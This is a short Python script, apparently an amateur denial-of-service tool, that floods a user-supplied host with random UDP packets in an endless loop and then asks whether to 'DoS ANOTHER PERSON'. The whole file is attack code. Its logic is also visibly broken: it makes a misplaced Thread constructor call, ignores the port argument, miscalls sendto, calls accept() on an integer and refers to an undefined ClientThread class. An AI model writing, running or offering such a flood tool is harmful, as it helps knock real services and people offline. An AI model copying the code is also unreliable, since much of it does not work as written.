import socket 
import time 
import random 
import threading

class Denial:
	def __init__(self, host, port):
		threading.Thread.__init__(self)
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		self.connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.host = host
		self.port = 80
		self.duration = 0
		self.bytes = random._urandom(1024)
		self.send = 0

	def send_packet(self):
		while True:
			try:
				send_all = self.connection.sendto(self.bytes,(self.host, self.port))
				print("[+] THE DoS ATTACK HAS STARTED ON THE FOLLOWING IP: " + self.host)
      
			except UnboundLocalError:
				try:
					pass
					send_all = self.connection.sendto(self.bytes(self.host, self.port))
				except:
					pass
			except KeyboardInterrupt:
				print("\n")
				print("[+] Exiting... ")
				print("\n") 
		while True:
			connect_all = send_all.accept()
			newthread = ClientThread(send_all)
			newthread.start()

			print("Press Control^c")
			more_dos = input("[+] WOULD YOU LIKE TO DoS ANOTHER PERSON[exit/return]: ")

			if more_dos == "exit":
				self.connection.close()
				exit()
			elif more_dos == "return":
				self.send_packet()
			else:
				self.connection.close()
				exit()

result = Denial(input(), 80)
result.send_packet()